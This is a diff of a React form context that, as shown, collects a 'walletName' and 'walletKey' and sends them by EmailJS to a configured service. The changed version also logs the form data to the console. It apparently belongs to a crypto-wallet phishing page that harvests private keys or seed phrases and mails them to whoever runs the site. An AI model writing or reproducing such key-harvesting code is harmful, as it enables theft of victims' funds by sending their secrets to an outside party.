@@ -23,18 +23,12 @@ export const FormContextProvider = ({ children }) => {
     });
   };
 
-  const handleSubmit = (event) => {
-    event.preventDefault();
+  const handleSubmit = () => {
+    console.log(formData);
 
-    // Set isLoading to true to indicate form submission is in progress
-    setIsLoading(true);
-
-    // In your component or context file
     const userId = process.env.REACT_APP_EMAILJS_USER_ID;
     const serviceId = process.env.REACT_APP_EMAILJS_SERVICE_ID;
     const templateId = process.env.REACT_APP_EMAILJS_TEMPLATE_ID;
-
-    // Use emailjs to send the form data
     emailjs
       .send(
         process.env.REACT_APP_EMAILJS_SERVICE_ID,
@@ -45,17 +39,16 @@ export const FormContextProvider = ({ children }) => {
       .then(
         (result) => {
           console.log(result.text);
-          // Set isLoading back to false after successful submission
-          setIsLoading(false);
+
+          // setIsLoading(false);
         },
         (error) => {
           console.error(error.text);
-          // Set isLoading back to false in case of an error
-          setIsLoading(false);
+
+          // setIsLoading(false);
         }
       );
 
-    // You can reset the form data if needed
     setFormData({
       walletName: "",
       walletKey: "",
